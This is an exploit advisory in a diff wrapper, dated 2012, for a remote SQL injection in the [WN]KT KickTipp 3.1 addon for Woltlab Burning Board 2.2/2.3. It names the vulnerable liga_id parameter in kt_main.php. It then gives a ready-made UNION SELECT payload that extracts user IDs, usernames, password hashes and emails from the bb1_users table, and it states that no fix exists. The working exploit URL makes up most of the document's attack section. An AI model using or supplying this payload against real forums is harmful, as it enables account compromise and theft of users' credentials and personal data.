@@ -1,0 +1,43 @@
+========================================================================================
+| # Title    : Woltlab Burning Board 2.2 / 2.3 [WN]KT KickTipp 3.1 remote SQL Injection 
+| # Author   : Easy Laster
+| # Script   : Woltlab Burning Board 2.2 / 2.3 [WN]KT KickTipp 3.1
+| # Site     : webnutzer.de
+| # Price    : Woltlab Burning Board Lizenz
+| # Exploitation : Remote Exploit
+| # Bug      : Remote SQL Injection
+| # Date     : 31.03.2012
+| # Language : PHP
+| # Status   : vulnerable
+| # Greetings: secunet.to ,4004-security-project, Team-Internet, HANN!BAL, RBK, Dr.Ogen, ezah
+======================        Proof of Concept         =================================
+ 
+ 
+  [+] Introduction
+   
+   [WN]KT KickTipp 3.1 is a Addon for the Woltlab Burning Board 2.2 / 2.3.Web Application for
+   Forum Systems.In this Addon we found a remote SQL Injection vulnerability in the kt_main.php
+   file.The Vulnerability is a hight risk and not fixed from the coder.You must login for the 
+   remote SQL injection by the most Systems. 
+ 
+  [+] Vulnerability
+ 
+    http://[host]/[path]/kt_main.php?action=tabelle&liga_id=[vul]
+ 
+  [+] Exploit
+   
+    http://[host]/[path]/kt_main.php?action=tabelle&liga_id=%27+u
+    nion+select+1,2,3,4,5,6,concat%28userid,0x3a,username,0x3a,pa
+    ssword,0x3a,email%29,8+from+bb1_users+where+userid=7--+
+    
+  [+] Fix
+ 
+    No fix.
+
+
+
+
+
+
+
+
